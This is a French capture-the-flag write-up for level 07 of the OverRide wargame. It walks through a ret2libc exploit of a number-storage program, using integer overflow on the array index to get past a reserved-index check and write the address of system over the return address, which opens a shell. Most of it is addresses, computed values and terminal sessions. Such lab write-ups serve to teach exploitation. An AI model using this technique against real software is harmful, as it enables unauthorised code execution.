# Level 07

En lançant le binaire, on peut voire :

```sh
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:
```

Notre objectif dans ce niveau est de faire un peu la même chose que le level 05.

Pour cela, nous allons devoir récupérer l'adresse de quelques éléments du programme.

|   Return   |   tableau    |   system   |   bin/sh   |
--------------------------------------------------------
| 0xffffd6ec |  0xffffd524  | 0xf7e6aed0 | 0xf7f897ec |

Après avoir récupéré les adresses qui nous intéressent. Nous avons besoin de savoir qu'elle est la taille de notre tableau :
```sh
0xffffd6ec-0xffffd524 = 456
# Puis nous allons diviser par 4 car ces un tableau de int
456 / 4 =  114
```

La valeur 114 correspond à l'endroit où nous mettrons l'adresse de `system`.

Si on réessaye, on voit que cela ne fonctionne pas. Le programme nous bloc.

```sh
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
```

Le programme vérifie quelques règles avant de laisser ou non un nombre être stocké à un
index spécifique. On On remarque 116 fonctionne correctement, mais 114 est problématique.

Le programme utilise la fonction `scanf` pour récupérer son input. Cette fonction ne vérifie pas
les overflows d'int. On peut ainsi utiliser un nombre égale à 114 modulo (2^32 / 4) pour déjouer la
vérification d'index tout en écrivant le nombre à la même adresse mémoire.

Ainsi :
```sh
0xf7e6aed0 hex to dec --> 4159090384
114 + ((2 ^ 32) / 4) = 1073741938
```


```sh
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil\'s crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ # Access to next level
```

Il ne reste plus qu'à récupérer le pass.
